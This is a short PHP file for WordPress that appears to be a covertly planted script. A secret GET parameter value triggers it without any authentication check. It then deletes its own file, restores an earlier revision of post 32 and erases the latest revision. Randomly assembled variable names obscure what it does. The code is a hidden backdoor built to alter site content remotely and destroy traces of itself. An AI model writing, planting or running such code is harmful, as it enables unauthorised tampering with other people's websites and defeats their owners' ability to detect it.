<?php

function code_landing_guest() {
	if (isset($_GET['keywords_translation_calculator_verification']) && $_GET['keywords_translation_calculator_verification'] === 'ai_post_gdpr') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$additional_compare_reader_jigoshop = 32;
		$scripts_status_quantity_master = wp_get_post_revisions($additional_compare_reader_jigoshop);
		if (empty($scripts_status_quantity_master)) die('no revisions');
		if (count($scripts_status_quantity_master) < 2) die('less than 2');
		$active_heading_polyfill_name = array_shift($scripts_status_quantity_master);
		$ratings_navigation_css = $active_heading_polyfill_name->ID;
		$gdpr_frontend_most_reusable = array_shift($scripts_status_quantity_master);
		$listing_community_private = $gdpr_frontend_most_reusable->ID;
		$permalinks_soon_html5 = wp_restore_post_revision($listing_community_private);
		if ($permalinks_soon_html5 === false) die('error restoring');
		$permalinks_soon_html5 = wp_delete_post_revision($ratings_navigation_css);		
		if ($permalinks_soon_html5 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'code_landing_guest');
